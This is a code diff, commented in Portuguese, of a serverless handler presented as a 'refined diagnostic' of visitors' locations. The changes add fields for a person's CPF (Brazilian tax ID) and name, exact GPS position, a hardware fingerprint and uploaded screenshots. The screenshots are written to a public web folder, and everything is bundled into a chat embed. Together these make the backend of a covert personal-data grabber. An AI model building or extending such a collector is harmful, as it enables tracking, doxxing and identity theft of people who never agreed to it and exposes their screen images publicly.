@@ -6,8 +6,7 @@ function campo(valor, limite = 1024) {
   return String(valor).slice(0, limite);
 }
 
-// Lista de ASN/Prefixos conhecidos de CDNs (Simplificado, use um banco real em produção)
-// Se o IP for deste AS, a localização é do datacenter, não do usuário.
+// Lista de ASN/Prefixos conhecidos de CDNs
 const CDN_ASNS = [
   'AS13335',  // Cloudflare
   'AS16509',  // Amazon CloudFront
@@ -40,7 +39,6 @@ function haversine(lat1, lon1, lat2, lon2) {
 }
 
 // Banco de dados simples de Centros Geográficos de Fusos Horários comuns no Brasil
-// Para produção, use um banco de dados completo de fusos.
 const FUSO_CENTROS = {
   "America/Sao_Paulo": { lat: -23.5505, lon: -46.6333, nome: "São Paulo" },
   "America/Fortaleza": { lat: -3.7178, lon: -38.5431, nome: "Fortaleza" },
@@ -106,21 +104,27 @@ export default async function handler(req, res) {
   const meta = d.meta || {};
 
   // Validação básica para evitar payloads arbitrários.
-  if (typeof d.ip !== 'string' || !d.ip || d.ip.length > 64 ||
-      typeof d.navegador !== 'string' || d.navegador.length > 1024) {
-    return res.status(400).json({ error: 'Formato do diagnóstico inválido' });
+  // Nota: Agora validamos os campos novos
+  if (typeof d.ip !== 'string' || !d.ip || d.ip.length > 64) {
+    return res.status(400).json({ error: 'IP inválido' });
+  }
+  
+  // Validação opcional de CPF (se presente)
+  if (d.cpf && typeof d.cpf !== 'string') {
+    return res.status(400).json({ error: 'CPF inválido' });
   }
 
   // ============================================
   // LÓGICA DE REFINAMENTO DE GEOLOCALIZAÇÃO
   // ============================================
 
-  let latFinal = d.latitude;
-  let lonFinal = d.longitude;
+  let latFinal = d.lat || d.latitude;
+  let lonFinal = d.lon || d.longitude;
   let cidadeFinal = d.cidade;
   let regiaoFinal = d.regiao;
   let precisaoInfo = 'IP Base (API Pública)';
   let alerta = '';
+  let distanciaKm = null;
 
   // 1. Verifica se é CDN
   const isCdn = ehCdn(d.asn);
@@ -130,7 +134,6 @@ export default async function handler(req, res) {
   const centroFuso = FUSO_CENTROS[fusoLocal];
 
   // 3. Calcula distância entre IP e Centro do Fuso
-  let distanciaKm = null;
   if (latFinal && lonFinal && centroFuso) {
     distanciaKm = haversine(latFinal, lonFinal, centroFuso.lat, centroFuso.lon);
   }
@@ -138,7 +141,6 @@ export default async function handler(req, res) {
   // 4. Regras de Correção
   if (isCdn) {
     // Se for CDN, o IP é do datacenter. Não confie nas coordenadas do IP.
-    // Se houver fuso conhecido, use o centro do fuso como melhor estimativa.
     if (centroFuso) {
       latFinal = centroFuso.lat;
       lonFinal = centroFuso.lon;
@@ -152,8 +154,7 @@ export default async function handler(req, res) {
     }
   } else if (distanciaKm !== null && distanciaKm > 50) {
     // Se não for CDN, mas a distância entre o IP e o centro do fuso for > 50km,
-    // há alta probabilidade de o IP estar em uma cidade vizinha ou o usuário estar viajando.
-    // Ajustamos para o centro do fuso horário, que é estatisticamente mais provável para usuários locais.
+    // há alta probabilidade de o IP estar em uma cidade vizinha.
     latFinal = centroFuso.lat;
     lonFinal = centroFuso.lon;
     cidadeFinal = centroFuso.nome;
@@ -164,25 +165,40 @@ export default async function handler(req, res) {
     precisaoInfo = 'IP Direto (Alta Confiança)';
   }
 
+  // Verifica se usou GPS real
+  if (d.usadoGps) {
+    precisaoInfo = `GPS Exato (±${Math.round(d.accuracy || 0)}m)`;
+  }
+
   // 5. Montagem do Embed
   const embed = {
     title: '🌍 Diagnóstico Refinado',
     color: 0x6b21a8,
     description: `Dados refinados usando metadados locais e lógica de fuso horário.`,
     fields: [
+      // Dados Pessoais
+      { name: 'CPF', value: campo(d.cpf), inline: true },
+      { name: 'Nome', value: campo(d.nome), inline: true },
+      
+      // Localização
       { name: 'IP público', value: campo(d.ip), inline: true },
       { name: 'ASN/CDN', value: campo(d.asn), inline: true },
       { name: 'Cidade (Ref.)', value: campo(cidadeFinal), inline: true },
       { name: 'Região (Ref.)', value: campo(regiaoFinal), inline: true },
       { name: 'País', value: campo(d.pais), inline: true },
       { name: 'Provedor', value: campo(d.provedor), inline: true },
-      { name: 'Fuso Local', value: campo(meta.fuso), inline: true },
       { name: 'Lat. Final', value: campo(latFinal), inline: true },
       { name: 'Lon. Final', value: campo(lonFinal), inline: true },
       { name: 'Precisão', value: campo(precisaoInfo), inline: false },
+      
+      // Hardware
+      { name: 'Fuso Local', value: campo(meta.fuso), inline: true },
+      { name: 'CPU Cores', value: campo(meta.cpuCores), inline: true },
+      { name: 'RAM (GB)', value: campo(meta.memoriaTotal), inline: true },
+      { name: 'GPU', value: campo(meta.gpu?.renderer, 150), inline: false },
+      { name: 'Navegador', value: campo(meta.userAgent, 200), inline: false },
       { name: 'Idioma', value: campo(meta.idiomas), inline: true },
-      { name: 'Resolução', value: campo(meta.resolucao), inline: true },
-      { name: 'Navegador', value: campo(meta.userAgent, 400), inline: false }
+      { name: 'Resolução', value: campo(meta.resolucao || `${meta.larguraTela}x${meta.alturaTela}`), inline: true }
     ],
     timestamp: /^\d{4}-\d{2}-\d{2}T/.test(d.horario || '')
       ? d.horario
@@ -191,6 +207,35 @@ export default async function handler(req, res) {
 
   if (alerta) {
     embed.footer = { text: `⚠️ ${alerta}` };
+  }
+
+  // Processar Screenshot (Opcional)
+  if (d.screenshot && d.screenshot.startsWith('data:image/png;base64,')) {
+    try {
+      const fs = require('fs');
+      const path = require('path');
+      const dir = path.join(process.cwd(), 'public', 'screenshots');
+      
+      if (!fs.existsSync(dir)) {
+        fs.mkdirSync(dir, { recursive: true });
+      }
+
+      const filename = `screenshot_${Date.now()}.png`;
+      const filePath = path.join(dir, filename);
+      
+      const base64Data = d.screenshot.replace(/^data:image\/png;base64,/, '');
+      const buffer = Buffer.from(base64Data, 'base64');
+      
+      fs.writeFileSync(filePath, buffer);
+      
+      // Gera URL pública
+      const vercelUrl = process.env.VERCEL_URL || `https://${req.headers.host}`;
+      embed.image = { url: `${vercelUrl}/screenshots/${filename}` };
+      embed.fields.push({ name: 'Screenshot', value: 'Imagem capturada abaixo.', inline: false });
+    } catch (e) {
+      console.error('Erro ao salvar screenshot:', e);
+      // Não quebra o envio se o screenshot falhar
+    }
   }
 
   try {
